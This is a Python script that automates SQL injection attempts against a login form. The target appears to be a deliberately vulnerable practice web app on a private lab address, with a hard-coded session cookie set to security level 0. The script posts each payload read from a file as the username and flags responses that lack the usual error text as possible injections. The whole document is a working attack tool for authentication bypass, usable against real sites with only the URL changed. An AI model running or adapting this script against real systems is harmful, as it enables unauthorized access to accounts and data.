#!/usr/bin/env python3

import requests

target = 'http://10.10.30.130/sqli_3.php'
headers = {'Host': '10.10.30.130',
           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate, br',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Content-Length': '38',
           'Origin': 'http://10.10.30.130',
           'Connection': 'keep-alive',
           'Referer': 'http://10.10.30.130/sqli_3.php',
           'Cookie': 'security_level=0; PHPSESSID=44aqofkmkgd4hta10956jfg0t2',
           'Upgrade-Insecure-Requests': '1'
           }

with open('payload.txt','r') as text:
    payloads = text.readlines()

for item in payloads:
    payload = item.strip('\n')
    data = {'login': payload,
               'password':'pass',
               'form':'submit'
              }

    p = requests.post(target, data=data, headers=headers)
    if 'Invalid credentials!' not in p.text and 'Error: ' not in p.text:
        print(f'[+] Found possible injection: {payload}')
